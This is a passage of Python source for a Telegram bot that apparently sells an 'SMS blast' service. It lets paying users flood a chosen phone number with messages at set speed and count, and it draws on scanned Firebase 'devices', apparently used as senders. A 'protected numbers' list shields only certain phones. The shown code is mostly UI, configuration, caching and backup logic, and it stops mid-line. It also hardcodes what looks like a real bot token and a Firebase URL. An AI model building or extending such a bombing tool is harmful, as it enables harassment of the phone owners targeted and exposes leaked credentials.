import asyncio, json, os, re, time, logging, random, string, threading, io, shutil, glob, html, base64, gzip, gc
from datetime import datetime, timezone, timedelta
from urllib.parse import urlparse

_IST = timezone(timedelta(hours=5, minutes=30))  # India Standard Time (UTC+5:30)


def now_ist() -> datetime:
    """Ab bot ke saare timestamps India (IST) time mein — VPS ki timezone se independent."""
    return datetime.now(_IST)


def _human_size(n: int) -> str:
    if n >= 1024 * 1024:
        return f"{n/1024/1024:.1f}MB"
    if n >= 1024:
        return f"{n/1024:.0f}KB"
    return f"{n}B"


_TG_API = "https://api.telegram.org"
from copy import deepcopy
from collections import defaultdict

import aiohttp
from aiogram import Bot, Dispatcher, F, Router, BaseMiddleware
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ChatMemberUpdated,
    FSInputFile,
    ErrorEvent,
    # ── Rich Messages (Bot API 10.1+) ──
    InputRichMessage,
    InputRichBlockParagraph,
    InputRichBlockSectionHeading,
    InputRichBlockDivider,
    InputRichBlockPullQuotation,
    InputRichBlockBlockQuotation,
    InputRichBlockList,
    InputRichBlockListItem,
)
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import (
    TelegramBadRequest, TelegramConflictError, TelegramForbiddenError,
    TelegramRetryAfter, TelegramAPIError
)

# ── Global safe-edit: "message is not modified" silently ignore ─────────────
# Jab user baar-baar same button (home/refresh) dabata hai aur content same rehta
# hai, Telegram ye BadRequest deta hai. Ab ye error saare edit_text calls se
# khud swallow ho jata hai (baaki BadRequests waise hi aate hain).
_orig_msg_edit_text = Message.edit_text
async def _safe_msg_edit_text(self, *args, **kwargs):
    try:
        return await _orig_msg_edit_text(self, *args, **kwargs)
    except TelegramBadRequest as _e:
        if "message is not modified" in str(_e):
            return None
        raise
Message.edit_text = _safe_msg_edit_text

_orig_bot_edit_message_text = Bot.edit_message_text
async def _safe_bot_edit_message_text(self, *args, **kwargs):
    try:
        return await _orig_bot_edit_message_text(self, *args, **kwargs)
    except TelegramBadRequest as _e:
        if "message is not modified" in str(_e):
            return None
        raise
Bot.edit_message_text = _safe_bot_edit_message_text

# ========== FILE LOCK FOR RACE CONDITION PROTECTION ==========
_DB_LOCK = threading.Lock()


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("BlastBot")

# ========== PREMIUM EMOJI IDs ==========
EMOJI_FIRE = "5289722755871162900"      # 🔥
EMOJI_STAR = "6336646834139700626"      # ⭐ PREMIUM
EMOJI_ROCKET = "6336674562448563935"    # 🚀 PREMIUM
EMOJI_CROWN = "6237927637906364256"     # 👑
EMOJI_SHIELD = "6235476345451716705"    # 🛡
EMOJI_MONEY = "6244678063775289843"     # 💰
EMOJI_PHONE = "6239930832128056797"     # 📱
EMOJI_CHECK = "6336861449360514102"     # ✅ PREMIUM
EMOJI_CROSS = "6337033209397649451"     # ❌ PREMIUM
EMOJI_WARNING = "4958526153955476488"   # ⚠️
EMOJI_LOCK = "4956719506027185156"      # 🔒
EMOJI_GIFT = "5084613633418199991"      # 🎁
EMOJI_BELL = "6336698133229082903"      # 📢 PREMIUM
EMOJI_GEAR = "5116414868357907335"      # ⚙️
EMOJI_VIDEO = "5372849966689566579"     # 📹

# ========== NUMBER PROTECTION (normalized) ==========
# Users +91 / 91 / bare 10-digit likh sakte hain — exact string match bypass ho jata tha.
# Sabhi numbers digits-only normalize hote hain (12-digit "91XXXXXXXXXX" → 10-digit),
# phir compare/store hota hai. is_protected_number() sabhi formats cover karti hai.

def norm_number(n) -> str:
    """Any phone format → canonical 10-digit India number (ya empty string).
    Covered: +91... / 91... / 0091... (international) / bare 10-digit /
    leading 0 (09876...) / spaces-dashes-dots. PROTECTION bypass ke liye
    saare formats ko same canonical form pe lana zaroori hai."""
    if n is None:
        return ""
    s = re.sub(r"\D", "", str(n))
    if len(s) == 12 and s.startswith("91"):
        s = s[2:]
    elif len(s) == 14 and s.startswith("0091"):
        s = s[4:]          # international dial format: 0091 + 10-digit
    elif len(s) == 11 and s.startswith("0"):
        s = s[1:]          # leading-zero local format: 0 + 10-digit
    return s if len(s) == 10 else ""

def protected_norm_set() -> set:
    """PROTECTED_NUMBERS ka normalized (10-digit) set."""
    out = set()
    for raw in PROTECTED_NUMBERS:
        n = norm_number(raw)
        if n:
            out.add(n)
    return out

def is_protected_number(num) -> bool:
    """+91/91/bare/any-whitespace — sab covered."""
    return norm_number(num) in protected_norm_set()


# ========== PREMIUM EMOJI POOL (premium custom emoji IDs) ==========
# Buttons + chat panels mein premium emoji render hote hain. rand_premium_emoji() random
# premium emoji deta hai chat flair ke liye (welcome video caption, etc.).
PREMIUM_EMOJIS = [
    "6100639476441161711", "6102462664288509137", "6100199534351097095", "6102926404792360795",
    "6100409966273764915", "6100430105375415737", "6102470558438400435", "6100451820730064687",
    "6102638599033858630", "6100179369479642954", "6100485115316542792", "6102661242101440205",
    "6102592514034770678", "6102475626499808862", "6102863908723236868", "6102510630483271620",
    "6282589525348720171", "6055377380204092112", "6055551219005398825", "6055181976371994390",
    "6055481009175010794", "6055484548228062462", "6055202102588742236", "6055450347403484860",
    "6055228576767155521", "6055183995006623379", "6337009415278828759", "6336756235546663929",
    "6334772471757020134", "6336732269629153634", "6336833407519038409", "6337048276142924106",
    "6337018975876030803", "6336608132189395373", "6336797785060286399", "6336685231147326793",
    "6336907611669011898", "6336988189550451848", "6337098578799893838", "6336808092981796477",
    "6337020083977592163", "6337112997005107243", "6337051755066433311", "6336835907190004485",
    "6336618976981818626", "6336857218817728795", "6336974471424908889", "6337125748763008448",
    "6337098338281725706", "6336962978092425393", "6336633214798404108", "6337019139084786234",
    "6337035356881296575", "6337026908680625329", "6336690569791676356", "6337106906741480828",
    "6337072645787361389", "6336720729052027967", "6336670885956557643", "6337113894653271580",
    "6334488003188105980", "6336721798498884548", "6336799284003873851", "6337112129421713282",
    "6336599202952388231", "6336755629956275338", "6334702021408465964", "6337109865973948062",
    "6336708763273142215", "6337083451925078342", "6336930400765484501", "6334788126912815244",
    "6337059606266651217", "6336812005697002754", "6336813629194640485", "6337085796977221633",
    "6336663202260065128", "6334324468013341494", "6337047855236129713", "6336782885818742144",
    "6336664645369076808", "6336910583786383660", "6336862179504954500", "6336697226990985005",
    "6336772620846899242", "6336573617832206335", "6337055242579876765", "6336789422758960593",
    "6336781331040577785", "6336603218746810844", "6337123072998383823", "6336894825551371014",
    "6334681658968513467", "6336799919659031563", "6336707603631972035", "6336874467406389346",
    "6336756411640323933", "6336608037700115865", "6336613247495445753", "6336973539417007164",
    "6336931040715612818", "6336653869296132233", "6336836572909938734", "6336798231736885254",
    "6336813951317187443", "6336866435817545002", "6336662845777780692", "6336580455420141312",
    "6336750437340816001", "6336677470141422007", "6337078718871117522", "6336931345658289868",
    "6336935322798005307", "6337010179783007229", "6336618208182673162", "6336580975111184057",
    "6336957184181543528", "6336991256157101601", "6336655355354815762", "6336795865209904645",
    "6337054177427988529", "6336855354801921798", "6336878444546105899", "6336861037043654967",
    "6336662472115626382", "6337093386184432717", "6336637947852365586", "6336876696494417749",
    "6334678278829252492", "6337087411884923105", "6336989731443711607", "6336882614959349480",
    "6336886055228153516", "6336797591786757523", "6336674519498890396", "6336856849450540332",
    "6337048379222138619", "6336816932024491505", "6336672814396874442", "6336835035311644293",
    "6336668004033504924", "6336682357814205676", "6336764563488252026", "6337100812182887680",
    "6336575056646249129",
    # button wale 5 premium emoji bhi pool mein (taaki chat flair mein bhi aa sakein)
    "6336646834139700626", "6336674562448563935", "6336861449360514102", "6337033209397649451", "6336698133229082903",
]

def rand_premium_emoji() -> str:
    """Chat flair ke liye random premium emoji (tg-emoji markup)."""
    return em(random.choice(PREMIUM_EMOJIS), "✨")


BUTTERFLY_EMOJI = "🦋"  # welcome effect: aag (🔥) ki jagah ab butterfly
BUTTERFLY_EFFECT_ID = "5089460564141278042"  # ✨ sparkle screen effect — stylish; reject ho toh plain butterfly

SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "aʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫrsᴛuᴠᴡxʏᴢaʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫrsᴛuᴠᴡxʏᴢ0123456789"
)

def sc(text: str) -> str:
    return text.translate(SMALL_CAPS_MAP)

# /start ka INSTANT boot sequence — heavy DB work se PEHLE bheja jaata hai (bot turant zinda lage):
#   pehla message: brand + hourglass  ->  TYPING effect: "system starting" char-by-char -> " gear" -> final panel
#   → final panel (sms blast) wahi message mein edit ho jaata hai (ek hi message)
BOOT_BRAND = "🥷 ◤" + sc("droid") + "◢"  # mera naam — ninja emoji + ◤◢ frame
BOOT_WORDS = [sc("droid"), sc("system")]  # brand words — WORD-BY-WORD animation (1 bar me 1 word)
BOOT_TYPE_WORD = sc("loading")  # smooth typing word (premium small-caps font)
BOOT_CURSOR = "\u258a"  # typing cursor (typing feel)
BOOT_FINAL_TEXT = "🥷 ◤" + " ".join(BOOT_WORDS) + "◢ ⚙️"
START_LOADING_TEXT = "⏳"  # instant pehla message (phir smooth typing shuru)

def em(emoji_id: str, fallback: str = "⭐") -> str:
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

def btn(text: str, callback_data: str, emoji_id: str = None, fallback_emoji: str = "", style: str = None) -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    kwargs = {"text": label, "callback_data": callback_data}
    if emoji_id:
        kwargs["icon_custom_emoji_id"] = emoji_id
    if style in ["primary", "success", "danger"]:
        kwargs["style"] = style
    return InlineKeyboardButton(**kwargs)

def btn_url(text: str, url: str, emoji_id: str = None, fallback_emoji: str = "", style: str = None) -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    kwargs = {"text": label, "url": url}
    if emoji_id:
        kwargs["icon_custom_emoji_id"] = emoji_id
    if style in ["primary", "success", "danger"]:
        kwargs["style"] = style
    return InlineKeyboardButton(**kwargs)

def style_btn(text: str, style: str = "primary", request_contact: bool = False, request_location: bool = False) -> KeyboardButton:
    return KeyboardButton(
        text=sc(text),
        style=style if style in ["primary", "success", "danger"] else None,
        request_contact=request_contact,
        request_location=request_location
    )

def default_reply_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [style_btn("🚀 Start Blast", style="success"), style_btn("📹 Videos", style="primary")],
            [style_btn("💰 Credits", style="primary"), style_btn("🛑 Stop Blast", style="danger")]
        ],
        resize_keyboard=True
    )

# ════════════ ENV.JSON LOADER (Render / VPS deploy) ════════════
# Same folder (script dir → cwd) se env.json padho aur uski values ko
# os.environ mein daalo — TAAKI BOT_TOKEN / BLAST_DATA_FILE / PORT waghera
# bina environment variables ke bhi JSON file se aa jayein.
# PRIORITY: asli environment variables > env.json > code default.
# (Render dashboard pe env var set ho toh wahi chalega — env.json override nahi karta.)
# File missing / corrupt → silent skip (bot kabhi crash nahi hoga).
def _load_env_json():
    here = os.path.dirname(os.path.abspath(__file__))
    seen = set()
    for base in (here, os.getcwd()):
        try:
            base = os.path.abspath(base)
        except Exception:
            continue
        if base in seen:
            continue
        seen.add(base)
        path = os.path.join(base, "env.json")
        try:
            if not os.path.isfile(path):
                continue
            with open(path, "r", encoding="utf-8") as _f:
                _cfg = json.load(_f)
        except Exception:
            continue
        if not isinstance(_cfg, dict):
            continue
        _n = 0
        for _k, _v in _cfg.items():
            _k = str(_k).strip()
            if not _k or _k.startswith("_"):
                continue
            if _v is None:
                continue
            if str(os.environ.get(_k) or "").strip():
                continue  # asli env var priority (Render dashboard)
            os.environ[_k] = str(_v)
            _n += 1
        if _n:
            print(f"[ENV] env.json loaded from {path} — {_n} var(s)")
        return  # pehli valid env.json hi use hogi

_load_env_json()

MAIN_OWNER = 8987478830
SUPER_ADMIN_NAME = "@DroidDeveloper"
SUPER_ADMIN_LINK = "https://t.me/DroidDeveloper"
SUPER_ADMINS = [8987478830]

BOT_TOKEN = os.getenv("BOT_TOKEN", "8985037358:AAGLU3RWKj-YZCV4u9Vyensz7dKK64N0uCU")
LOG_CHANNEL_ID = -1003259705330  # log channel (bot ko iska ADMIN banana zaroori hai)

# ── FIREBASE CLOUD BACKUP ────────────────────────────────────────────────
# Apni PUBLIC Firebase RTDB ka URL yahan daalo, e.g.:
# _BACKUP_FB_URL = "https://my-bot-backup-default-rtdb.firebaseio.com"
# Bot ka poora data isme hourly + har 15 min save pe push hota hai;
# restart pe DB missing/corrupt ho toh isi se AUTO-IMPORT hota hai.
# Priority: env BLAST_BACKUP_FB_URL > Owner Panel (backup firebase button) > yahan ka constant
_BACKUP_FB_URL = "https://backup-8c392-default-rtdb.firebaseio.com"

_DATA_FILE = os.environ.get("BLAST_DATA_FILE", "").strip() or "blast_data.json"
# Local backup folder — default: DB file ke same folder.
# Render/VPS pe Persistent Disk ho toh BLAST_BACKUP_DIR us disk ki path par set karo
# (e.g. BLAST_BACKUP_DIR=/var/data) — tab redeploy/restart par bhi backups safe rahenge.
_BACKUP_DIR = os.environ.get("BLAST_BACKUP_DIR", "").strip() or os.path.dirname(os.path.abspath(_DATA_FILE))
try:
    os.makedirs(_BACKUP_DIR, exist_ok=True)
except Exception:
    pass
_SHADOW_BACKUP_INTERVAL = 900.0  # save() ke baad 15 min se purana backup ho toh turant nayi local copy
_LAST_SHADOW_BACKUP_TS = [0.0]
_VERSION = "v3.2-PREMIUM"
_PROGRESS_UPDATE_INTERVAL = 1.0
_SEND_DELAY = 0.3
_BACKGROUND_SCAN_INTERVAL = 86400.0  # 24 ghante — ek din mein sirf 1 baar scan (VPS load kam, 1k+ devices safe)
# SMS history cap: top-level d["sms_history"][uid] UNBOUNDED badh rahi thi (live DB mein 57.8MB!
# -> DB 19MB disk + 59MB RAM + har save 19MB likhta + backup 19MB push = 512MB Render OOM).
# UI sirf last 10 dikhata hai — last 25 rakho (disk+RAM+save+backup+restore sab fast)
_SMS_HISTORY_MAX = 25

SPEED_FAST = 0.05
SPEED_MEDIUM = 0.2
SPEED_SLOW = 0.5
SPEED_DEFAULT = SPEED_MEDIUM

async def send_butterfly_effect_private(bot: Bot, chat_id: int):
    """Welcome effect: butterfly emoji + STYLISH screen effect (sparkle).
    Pattern aag wala hi: emoji bhejo → 2s ruko → delete karo.
    Effect-ID reject ho (invalid/expired) → plain butterfly fallback (butterfly kabhi miss nahi)."""
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": chat_id, "text": BUTTERFLY_EMOJI, "message_effect_id": BUTTERFLY_EFFECT_ID}
            try:
                async with session.post(url, json=payload, timeout=5) as resp:
                    res = await resp.json()
                if not res.get("ok"):
                    raise RuntimeError(res.get("description", "effect not accepted"))
                msg_id = res["result"]["message_id"]
            except Exception:
                payload = {"chat_id": chat_id, "text": BUTTERFLY_EMOJI}
                async with session.post(url, json=payload, timeout=5) as resp:
                    res = await resp.json()
                msg_id = res["result"]["message_id"]
            await asyncio.sleep(2)
            del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
            await session.post(del_url, json={"chat_id": chat_id, "message_id": msg_id})
    except Exception as e:
        log.warning(f"Butterfly Effect Trigger Failed: {e}")

async def send_channel_log(bot: Bot, text: str):
    try:
        await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"Failed to send channel log: {e}")

async def send_backup_once(bot: Bot):
    """Ek backup cycle.
    Firebase configured → sab storage Firebase mein (local file NAHI banegi — Render disk save),
    channel pe sirf text confirmation jaata hai.
    Firebase configured NAHI → legacy: local copy → GZIP → channel (+file_id manifest)."""
    d = load()
    if get_backup_fb_url(d):
        # ── Firebase mode: koi local backup file disk pe NAHI (256MB Render disk limit) ──
        try:
            ok, info = await fb_cloud_backup(d)
            if ok:
                log.info(f"Firebase cloud backup: {info}")
            else:
                log.warning(f"Firebase cloud backup fail: {info}")
        except Exception as e:
            log.error(f"Firebase cloud backup error: {e}")
            return
        try:
            await send_channel_log(bot, (
                f"📦 <b>AUTOMATIC DATABASE BACKUP</b> (☁️ Firebase)\n\n"
                f"📅 <b>Date & Time:</b> <code>{now_ist().strftime('%Y-%m-%d %H:%M:%S')}</code>\n"
                f"☁️ <b>Storage:</b> Firebase — <code>bot_backup/latest</code> + snap (max 6)\n"
                f"✅ <b>Status:</b> {info}\n"
                f"\n<i>Local file nahi banayi — sab storage Firebase mein (Render disk save).</i>\n"
                f"<i>Restore: Owner Panel → Backup Firebase → ♻️ Restore</i>"
            ))
        except Exception as e:
            log.warning(f"Backup channel msg fail: {e}")
        return
    # ── Legacy (Firebase nahi): local copy → GZIP → channel (+ manifest) ──
    # Step 1: PEHLE local backup copy banao — jo file bheji jaayegi wahi recent
    # direct backup hai. Isse channel bhejne mein koi bhi fail hone par bhi
    # local restore point hamesha safe rehta hai.
    local_backup = make_local_backup(d)
    if not local_backup:
        log.warning("Backup skip: main DB file missing")
        return
    # Step 2: GZIP compress karke channel par bhejo (40MB+ DB bhi chhota file banta hai)
    # + file_id manifest save karo — RESTART PE CHANNEL SE AUTO-IMPORT isi se hota hai
    try:
        raw_size = os.path.getsize(local_backup)
        gz_path = local_backup + ".gz"
        with open(local_backup, "rb") as f_in, gzip.open(gz_path, "wb") as f_out:
            shutil.copyfileobj(f_in, f_out)
        gz_size = os.path.getsize(gz_path)
        caption_text = (
            f"📦 <b>AUTOMATIC DATABASE BACKUP</b>\n\n"
            f"📅 <b>Date & Time:</b> <code>{now_ist().strftime('%Y-%m-%d %H:%M:%S')}</code>\n"
            f"📂 <b>File:</b> <code>{local_backup}</code>\n"
            f"🗜 <b>Size:</b> {_human_size(raw_size)} → <b>{_human_size(gz_size)}</b> (gzip)\n"
            f"\n<i>Import DB button se isi .gz file ko bhej ke import kar sakte ho.</i>"
        )
        doc = await bot.send_document(
            chat_id=LOG_CHANNEL_ID,
            document=FSInputFile(gz_path),
            caption=caption_text,
            parse_mode="HTML"
        )
        log.info(f"Backup sent to log channel: {gz_path} ({_human_size(gz_size)})")
        try:
            _save_channel_backup_ref(doc.document.file_id, doc.message_id, raw_size)
        except Exception as me:
            log.warning(f"Channel backup ref save fail: {me}")
    except Exception as e:
        log.error(f"Failed to send automatic database backup: {e} (local copy safe: {local_backup})")
    # Step 3: Firebase cloud backup (user ki apni Firebase — render-wipe se safe)
    try:
        ok, info = await fb_cloud_backup()
        if ok:
            log.info(f"Firebase cloud backup: {info}")
        elif info != "not_configured":
            log.warning(f"Firebase cloud backup fail: {info}")
    except Exception as e:
        log.error(f"Firebase cloud backup error: {e}")


async def background_backup_sender(bot: Bot):
    log.info("Background JSON Backup Task STARTED")
    while True:
        await asyncio.sleep(3600)
        try:
            await send_backup_once(bot)
        except Exception as e:
            log.error(f"Backup task error: {e}")


def make_local_backup(d: dict = None):
    """Latest DB ki local copy banao — yahi recent direct backup hai (auto-restore source).
    Channel upload ke PEHLI likhi jaati hai taaki bhejne mein fail hone par bhi backup safe rahe.
    ⚠️ Firebase configured ho toh local file NAHI banati — sab storage Firebase mein rehta hai
    (Render free tier ki 256MB disk 23MB+ DB ke backup files se storage-limit se takra jaati thi).
    Return: backup file name, ya None. """
    try:
        if not os.path.exists(_DATA_FILE):
            return None
        # Firebase mode: local disk pe backup file nahi — latest + snap/ (rotating 6) Firebase mein hai
        try:
            if get_backup_fb_url(d):
                return None
        except Exception:
            pass
        name = f"blast_data_backup_{now_ist().strftime('%Y%m%d_%H%M%S')}.json"
        local_backup = os.path.join(_BACKUP_DIR, name)
        shutil.copy2(_DATA_FILE, local_backup)
        # sirf last 7 local backups rakho (backup dir + CWD + script folder)
        for dd in {_BACKUP_DIR, ".", os.path.dirname(os.path.abspath(__file__))}:
            try:
                for old in sorted(glob.glob(os.path.join(dd, "blast_data_backup_*.json")))[:-7]:
                    try:
                        os.remove(old)
                    except OSError:
                        pass
            except Exception:
                pass
        return local_backup
    except Exception as be:
        log.warning(f"Local backup copy failed: {be}")
        return None


def _cleanup_local_backups_if_fb(d: dict = None) -> int:
    """Firebase mode mein purani local backup files (.json + .gz) disk se delete karo —
    Render free tier 256MB disk limit se bachav. Return: delete ki gayi file count.
    (Naye local backups ab make_local_backup guard se hi nahi bante.)"""
    try:
        if not get_backup_fb_url(d):
            return 0
    except Exception:
        return 0
    seen = set(); cnt = 0; freed = 0
    for dd in (_BACKUP_DIR, os.getcwd(), os.path.dirname(os.path.abspath(__file__))):
        try:
            for pat in ("blast_data_backup_*.json", "blast_data_backup_*.gz"):
                for p in glob.glob(os.path.join(dd, pat)):
                    ap = os.path.abspath(p)
                    if ap in seen:
                        continue
                    seen.add(ap)
                    try:
                        freed += os.path.getsize(ap)
                        os.remove(ap)
                        cnt += 1
                    except OSError:
                        pass
        except Exception:
            pass
    if cnt:
        log.info(f"[START] Firebase mode: {cnt} purani local backup file delete ({_human_size(freed)} disk free)")
    else:
        log.info("[START] Firebase mode: local backup files disabled — sab storage Firebase mein (disk save)")
    return cnt


async def safe_answer(cq, text=None, show_alert=False):
    """Callback query ka answer — query stale/already-answered ho (VPS slow load pe common)
    toh koi exception na aaye, bot crash na ho. Operation ho chuka hota hai, panel update hi
    confirmation hai. """
    try:
        if text:
            await cq.answer(text, show_alert=show_alert)
        else:
            await cq.answer()
    except Exception:
        pass

class UserSession:
    __slots__ = ['uid', 'cancelled', 'sent', 'failed', 'task', 'start_time', 'lock', 'number', 'target_uid', 'blast_data']

    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None
        self.target_uid = None
        self.blast_data = None

USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES = []
LAST_SCAN_TIME = 0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛarᴛᴇᴅ"
DEVICE_HEALTH_LOG = []
FB_DEVICE_COUNTS = {}
FB_SCAN_STATUS = {}  # per-DB last scan status: {"<fb_id>": "ok:42" | "http:423" | "error:msg"}
SCAN_PASS_WARN = {"423": 0, "404": 0, "other": 0}  # per-scan HTTP warn counts — scan ke end pe EKA summary (per-DB red flood khatam)
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS = {}

class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    autobc_msg = State()
    autobc_hours = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_type = State()
    add_plan_credits = State()
    add_plan_days = State()
    add_plan_unlimited = State()
    add_plan_features = State()
    add_plan_link = State()
    set_unlimited_uid = State()
    set_unlimited_days = State()
    global_unl_days = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()
    import_db = State()
    fb_editor_url = State()
    fb_editor_menu = State()
    fb_ed_path = State()
    fb_ed_value = State()
    fb_del_path = State()
    set_backup_fb = State()
    daily_reward_amount = State()
    weekly_bc_msg = State()
    weekly_bc_day = State()
    weekly_bc_time = State()
    set_token = State()

def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 3},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": []},
        "redeem_codes": {},
        "settings": {"ref_credits": 3, "max_owners": 6},
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": {},
        "videos": [],
        "daily_reward": {"enabled": False, "amount": 10, "last_give": {}},
        "auto_broadcast": {"enabled": False, "interval_hours": 24, "messages": [], "last_sent": 0},
        "weekly_broadcast": {"enabled": False, "day": 0, "time": "12:00", "message": "", "last_sent": 0},
        "bot_token": ""
    }

# In-memory DB cache — 5MB+ JSON ko har message pe dobara parse karna Render free tier ki
# 512MB RAM ko OOM kar deta tha (repeated 50-100MB allocations + fragmentation).
# Ab: parse EK baar, phir saare handlers cached dict use karte hain. save() cache update karta hai;
# direct file writes (restore/import) _data_cache_invalidate() se cache clear karte hain.
# "merged" flag: cache warm-up (restore check) ke baad defaults-merge pehli load() pe hota hai,
# taaki 22MB+ DB ki parse startup mein EKS baar ho (OOM-guard — pehle 3 baar hoti thi).
_DATA_CACHE = {"data": None, "mtime": 0.0, "size": 0, "merged": False}

def _data_cache_invalidate():
    """Main DB file save() ke ilawa kisi aur tarah se likhi gayi toh cache clear."""
    _DATA_CACHE["data"] = None
    _DATA_CACHE["mtime"] = 0.0
    _DATA_CACHE["size"] = 0
    _DATA_CACHE["merged"] = False

def _db_merge_defaults(data: dict):
    """Parsed DB data mein defaults + migrations apply karo (parse ke baad EK baar).
    load() ka parse-path aur cache-warm-up dono isi se kaam chalaate hain."""
    global PROTECTED_NUMBERS
    default = _default_data()
    for k, v in default.items():
        if k not in data:
            data[k] = v
    if MAIN_OWNER not in data.get("owners", []):
        data["owners"].insert(0, MAIN_OWNER)
    for uid_str, u in data.get("users", {}).items():
        if "credits" not in u:
            u["credits"] = 0
        if "sms_history" not in u:
            u["sms_history"] = []
        if "manual_added_credits" not in u:
            u["manual_added_credits"] = 0
    # One-time migration: unbounded sms_history cap karo (live DB mein 57.8MB thi —
    # OOM/restart + slow save/root cause). UI sirf last 10 dikhata hai.
    _sh_top = data.get("sms_history")
    if isinstance(_sh_top, dict):
        for _uk, _uh in _sh_top.items():
            if isinstance(_uh, list) and len(_uh) > _SMS_HISTORY_MAX:
                _sh_top[_uk] = _uh[-_SMS_HISTORY_MAX:]
    # Load protected numbers from disk into global (keys NORMALIZED — +91/91/bare sab ek hi key)
    _pn_raw = data.get("protected_numbers", {}) or {}
    PROTECTED_NUMBERS = {norm_number(k): v for k, v in _pn_raw.items() if norm_number(k)}

def load() -> dict:
    if os.path.exists(_DATA_FILE):
        try:
            st = os.stat(_DATA_FILE)
            if (_DATA_CACHE["data"] is not None
                    and st.st_mtime == _DATA_CACHE["mtime"]
                    and st.st_size == _DATA_CACHE["size"]):
                # in-memory copy — koi file parse nahi (CPU+RAM save).
                # merged-flag: cache warm-up se aaya raw dict pehle merge hota hai (ek hi baar)
                if not _DATA_CACHE["merged"]:
                    _db_merge_defaults(_DATA_CACHE["data"])
                    _DATA_CACHE["merged"] = True
                return _DATA_CACHE["data"]
            with _DB_LOCK:
                with open(_DATA_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
            _db_merge_defaults(data)
            _DATA_CACHE["data"] = data
            _DATA_CACHE["mtime"] = st.st_mtime
            _DATA_CACHE["size"] = st.st_size
            _DATA_CACHE["merged"] = True
            return data
        except Exception as e:
            log.error(f"Load error: {e}")
    d = _default_data()
    save(d)  # lock ke bahar call → koi deadlock nahi
    return d

def save(d: dict):
    with _DB_LOCK:
        # Sync PROTECTED_NUMBERS into data before saving
        d["protected_numbers"] = PROTECTED_NUMBERS
        # Atomic write: pehle .tmp mein, phir rename → power-cut pe bhi file corrupt nahi hogi
        tmp = _DATA_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            # Compact JSON (indent nahi) — file ~30% chhoti, save ~2x fast, memory churn kam
            json.dump(d, f, ensure_ascii=False)
        os.replace(tmp, _DATA_FILE)
        # Cache ko saved data se sync karo (agla load() file parse na kare)
        try:
            _st = os.stat(_DATA_FILE)
            _DATA_CACHE["data"] = d
            _DATA_CACHE["mtime"] = _st.st_mtime
            _DATA_CACHE["size"] = _st.st_size
            _DATA_CACHE["merged"] = True
        except Exception:
            pass
        # Shadow backup: DB change hote hi (15 min ka gap) local backup refresh karo
        # — restart/redeploy par data-loss window sirf 15 min ki rahe, 1 ghante ki nahi
        # (startup restore ke dauran NAHI — fresh empty DB ki backup agle restart pe poison ban jaati)
        try:
            if not _RESTORE_IN_PROGRESS[0] and time.time() - _LAST_SHADOW_BACKUP_TS[0] >= _SHADOW_BACKUP_INTERVAL:
                _sh_bk = make_local_backup(d)  # Firebase mode mein None (disk save)
                # interval ticked — file bani (retry na ho) ya Firebase mode mein intentional skip
                # (fail hone pe ts nahi update → agle save pe retry)
                if _sh_bk or get_backup_fb_url(d):
                    _LAST_SHADOW_BACKUP_TS[0] = time.time()
        except Exception:
            pass
        # Firebase cloud backup (agar configured) — 15 min gap, background task (save sync hai)
        # ⚠️ restore ke dauran KABHI NAHI — fresh empty DB poora latest backup kha jaata tha (race bug)
        try:
            if (not _RESTORE_IN_PROGRESS[0] and get_backup_fb_url(d)
